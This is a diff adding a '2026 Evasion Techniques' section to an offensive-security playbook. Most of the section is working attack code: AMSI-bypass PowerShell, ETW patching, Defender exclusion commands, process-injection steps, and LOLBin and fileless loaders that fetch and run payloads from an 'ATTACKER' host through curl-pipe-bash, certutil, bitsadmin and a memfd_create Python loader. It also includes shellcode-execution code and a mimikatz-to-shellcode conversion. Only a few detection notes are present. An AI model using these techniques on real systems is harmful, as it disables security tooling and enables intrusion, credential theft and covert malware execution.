@@ -617,3 +617,293 @@ echo "[$( date '+%Y-%m-%d %H:%M:%S' )] EVASION: Validation complete" >> "$LOG"
 | Beacon jitter | Random delay variation on C2 callbacks |
 | Timestamp preserve | `touch -r original modified` |
 | Polymorphic gen | Python random variable/encoding generator |
+
+---
+
+## 2026 Evasion Techniques
+
+### EDR Evasion: Direct Syscalls, Unhooking ntdll, ETW Patching
+
+```bash
+# Modern EDRs (CrowdStrike, SentinelOne, Defender for Endpoint) hook ntdll.dll
+# to intercept syscalls. Three primary bypass techniques:
+
+# 1. Direct Syscalls — skip ntdll entirely, call kernel directly
+# SysWhispers3 — generates syscall stubs for any Windows API
+git clone https://github.com/klezVirus/SysWhispers3.git
+cd SysWhispers3
+python3 syswhispers.py --preset common -o syscalls
+# Generates syscalls.h, syscalls.c, syscalls-asm.x64.asm
+# Use these instead of calling NtAllocateVirtualMemory etc. from ntdll
+
+# 2. Unhooking ntdll — load a fresh copy from disk, replace hooked version
+# In C (concept):
+# HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...);
+# Map the clean ntdll into memory
+# Copy the .text section over the hooked ntdll in the current process
+# Now all ntdll calls go through unhooked code
+
+# 3. Indirect Syscalls — call syscall instruction from within ntdll's memory range
+# (avoids EDR detection of syscall from non-ntdll memory)
+# HellsGate / HalosGate / TartarusGate techniques
+# https://github.com/am0nsec/HellsGate
+
+# ETW (Event Tracing for Windows) Patching
+# EDRs use ETW to monitor .NET, PowerShell, and syscalls
+# Patch EtwEventWrite to return immediately:
+# In C:
+# DWORD oldProtect;
+# void* etwAddr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
+# VirtualProtect(etwAddr, 1, PAGE_READWRITE, &oldProtect);
+# *(char*)etwAddr = 0xC3;  // RET instruction
+# VirtualProtect(etwAddr, 1, oldProtect, &oldProtect);
+
+# PowerShell ETW bypass (one-liner):
+# [Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)
+```
+
+### AMSI Bypass Techniques for PowerShell
+
+```powershell
+# AMSI (Anti-Malware Scan Interface) scans PowerShell, VBScript, JScript in memory.
+# Must be bypassed BEFORE loading any payload.
+
+# Method 1: Patching amsi.dll in memory (most reliable)
+# Find AmsiScanBuffer and patch it to return AMSI_RESULT_CLEAN
+$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}
+$f=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}
+[IntPtr]$ptr=$f.GetValue($null)
+[Int32[]]$buf=@(0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)
+
+# Method 2: Reflection-based (changes frequently to evade signatures)
+# Obfuscate the strings — "AmsiUtils", "amsiInitFailed" are signature-detected
+$v=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dAByAHUAZQA='))
+# ... set amsiInitFailed = true via reflection
+
+# Method 3: CLR hooking — redirect AmsiScanBuffer to a custom function
+# that always returns S_OK (no threat found)
+
+# Method 4: PowerShell downgrade — use PowerShell v2 (no AMSI)
+powershell.exe -version 2 -command "IEX(payload)"
+# Only works if .NET 2.0/3.5 is installed
+
+# Test if AMSI is active:
+# Try: "amsiutils" in PowerShell — if blocked, AMSI is active
+```
+
+### Windows Defender Exclusion Abuse
+
+```powershell
+# If you have local admin, add exclusions so Defender ignores your payloads.
+# This is NOT a vulnerability — it's an abuse of legitimate admin capability.
+
+# Add path exclusion:
+Add-MpPreference -ExclusionPath "C:\Users\Public\Tools"
+# Add process exclusion:
+Add-MpPreference -ExclusionProcess "payload.exe"
+# Add extension exclusion:
+Add-MpPreference -ExclusionExtension ".ps1"
+
+# Check existing exclusions:
+Get-MpPreference | Select-Object -Property ExclusionPath, ExclusionProcess, ExclusionExtension
+
+# cmd alternative (no PowerShell needed):
+reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Users\Public\Tools" /t REG_DWORD /d 0 /f
+
+# DETECTION: Exclusion changes are logged in:
+# Event ID 5007 in Microsoft-Windows-Windows Defender/Operational
+```
+
+### Process Hollowing and Process Doppelganging
+
+```c
+// Process Hollowing — create a legitimate process in suspended state,
+// hollow out its memory, inject payload, resume.
+// The payload runs under the PID of a trusted process (e.g., svchost.exe).
+
+// Concept (Windows C):
+// 1. CreateProcess("svchost.exe", ..., CREATE_SUSPENDED)
+// 2. NtUnmapViewOfSection(hProcess, baseAddress)  // hollow it
+// 3. VirtualAllocEx(hProcess, baseAddress, payloadSize, ...)
+// 4. WriteProcessMemory(hProcess, baseAddress, payload, ...)
+// 5. SetThreadContext(hThread, &ctx)  // point EIP/RIP to payload
+// 6. ResumeThread(hThread)
+
+// Tools:
+// - Donut: https://github.com/TheWover/donut — converts any .NET/PE/DLL to shellcode
+// - pe2shc: converts PE to position-independent shellcode
+
+// Process Doppelganging (abuses NTFS transactions):
+// 1. Create NTFS transaction
+// 2. Write payload to file inside transaction
+// 3. Create section from the transacted file
+// 4. Rollback transaction (file never appears on disk!)
+// 5. Create process from the section
+// Result: payload runs from a file that never existed on disk
+```
+
+### Reflective DLL Injection
+
+```bash
+# Load a DLL directly from memory — never touches disk.
+# The DLL maps itself into the target process.
+
+# sRDI — Shellcode Reflective DLL Injection
+git clone https://github.com/monoxgas/sRDI.git
+cd sRDI
+# Convert any DLL to reflective shellcode:
+python3 ConvertToShellcode.py payload.dll -o payload.bin
+
+# Inject via various methods:
+# - CreateRemoteThread
+# - QueueUserAPC
+# - NtQueueApcThreadEx (Earlybird injection)
+# - Thread hijacking (SuspendThread → SetThreadContext → ResumeThread)
+
+# BOF (Beacon Object Files) — Cobalt Strike / Sliver format
+# Small C programs compiled to COFF, loaded directly into beacon memory
+# No new process, no DLL on disk, no CreateRemoteThread
+```
+
+### Living-Off-The-Land Binaries (LOLBins) for 2026
+
+```bash
+# LOLBins are legitimate system binaries abused for offensive purposes.
+# They bypass application whitelisting because they're signed by Microsoft/OS vendor.
+
+# WINDOWS LOLBins:
+# Download payload:
+certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\update.exe
+bitsadmin /transfer job /download /priority high http://ATTACKER/payload.exe C:\Windows\Temp\update.exe
+curl.exe -o C:\Windows\Temp\update.exe http://ATTACKER/payload.exe  # curl ships with Win10+
+msedge.exe --headless --dump-dom http://ATTACKER/payload > C:\Windows\Temp\p.txt
+
+# Execute payload:
+mshta "javascript:a=new ActiveXObject('WScript.Shell');a.Run('calc.exe');close()"
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc")
+forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Temp\payload.exe"
+pcalua.exe -a C:\Windows\Temp\payload.exe
+
+# Compile on target:
+# C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:C:\Windows\Temp\p.exe payload.cs
+
+# LINUX LOLBins:
+# Download:
+curl -o /tmp/p http://ATTACKER/payload
+wget -O /tmp/p http://ATTACKER/payload
+python3 -c "import urllib.request; urllib.request.urlretrieve('http://ATTACKER/payload', '/tmp/p')"
+
+# Execute without touching disk:
+curl http://ATTACKER/script.sh | bash
+python3 -c "import urllib.request; exec(urllib.request.urlopen('http://ATTACKER/script.py').read())"
+
+# Lateral movement:
+ssh -o ProxyCommand="curl -s http://ATTACKER/shell.sh | bash" x
+# GTFOBins reference: https://gtfobins.github.io/
+```
+
+### Fileless Malware Techniques
+
+```bash
+# Goal: execute payload without EVER writing to disk.
+# Only exists in memory — survives forensic disk analysis.
+
+# Linux — memfd_create (anonymous file in memory)
+python3 << 'PYEOF'
+import ctypes, os, urllib.request
+
+# Download payload into memory
+payload = urllib.request.urlopen("http://ATTACKER/elf_payload").read()
+
+# Create anonymous file in memory (no disk path)
+libc = ctypes.CDLL("libc.so.6")
+fd = libc.memfd_create(b"", 0)  # MFD_CLOEXEC = 1
+
+# Write payload to memory-only fd
+os.write(fd, payload)
+
+# Execute from /proc/self/fd/N (points to memory, not disk)
+os.execve(f"/proc/self/fd/{fd}", [f"/proc/self/fd/{fd}"], os.environ)
+PYEOF
+
+# Linux — execute ELF from stdin (no file at all)
+curl -s http://ATTACKER/payload | /proc/self/exe  # won't work for all payloads
+
+# Windows — .NET in-memory execution
+# Load assembly from byte array — never on disk:
+# [System.Reflection.Assembly]::Load([byte[]]$payload).EntryPoint.Invoke($null, @())
+
+# Windows — VBS/JScript via mshta (loads from URL, runs in memory)
+# mshta http://ATTACKER/payload.hta
+```
+
+### Memory-Only Execution (No Disk Artifacts)
+
+```bash
+# Execute code entirely in process memory. No files, no temp files, no artifacts.
+
+# Donut — convert any .NET/PE/DLL/VBS/JS to position-independent shellcode
+git clone https://github.com/TheWover/donut.git
+cd donut && make
+# Convert mimikatz.exe to shellcode:
+./donut -i mimikatz.exe -o payload.bin -f 1 -a 2
+# -f 1 = raw shellcode, -a 2 = x64
+
+# Inject shellcode into memory:
+python3 << 'PYEOF'
+import ctypes, mmap
+
+shellcode = open("payload.bin", "rb").read()
+
+# Allocate executable memory
+mem = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
+mem.write(shellcode)
+
+# Cast to function pointer and execute
+ctypes.cast(
+    ctypes.c_void_p(ctypes.addressof(ctypes.c_char.from_buffer(mem))),
+    ctypes.CFUNCTYPE(None)
+)()
+PYEOF
+
+# Linux — /dev/shm execution (tmpfs — RAM only, never on physical disk)
+curl -s http://ATTACKER/payload -o /dev/shm/.update
+chmod +x /dev/shm/.update && /dev/shm/.update && rm -f /dev/shm/.update
+# Note: still visible via /proc and ls /dev/shm during execution
+```
+
+### Sleep Obfuscation (Ekko, Foliage)
+
+```c
+// When a payload sleeps between callbacks, its memory is a sitting duck for
+// memory scanners. Sleep obfuscation ENCRYPTS the payload in memory during sleep.
+
+// Ekko — encrypts entire payload image during SleepEx using ROP chain
+// https://github.com/Cracked5pider/Ekko
+// How it works:
+// 1. Before sleeping, encrypt the payload's memory region with RC4/AES
+// 2. Change memory permissions to PAGE_READONLY (no executable = less suspicious)
+// 3. Queue APC to decrypt + restore permissions after sleep timer expires
+// 4. SleepEx(interval, TRUE) → triggers the APC chain → decrypt → resume
+
+// Foliage — similar concept using NtApcRoutine
+// https://github.com/SecIdiot/FOLIAGE
+// Uses CreateTimerQueueTimer with callback chain:
+// 1. VirtualProtect(RW) → memcpy(encrypted) → VirtualProtect(RX) → SetEvent
+
+// Detection: EDRs scan for ROP gadgets and timer-queue abuse
+// Counter: use indirect syscalls for the VirtualProtect calls
+
+// Practical implementation with Sliver/Havoc:
+// Sliver C2 has built-in sleep obfuscation:
+// sliver > generate --os windows --arch amd64 --format exe --sleep-obf
+// Havoc: enable "Sleep Technique" in payload config (Ekko or Zilean)
+
+// Linux equivalent — encrypt .text section during sleep:
+// mprotect(base, size, PROT_READ | PROT_WRITE);
+// xor_encrypt(base, size, key);
+// sleep(interval);
+// xor_encrypt(base, size, key);  // decrypt
+// mprotect(base, size, PROT_READ | PROT_EXEC);
+```
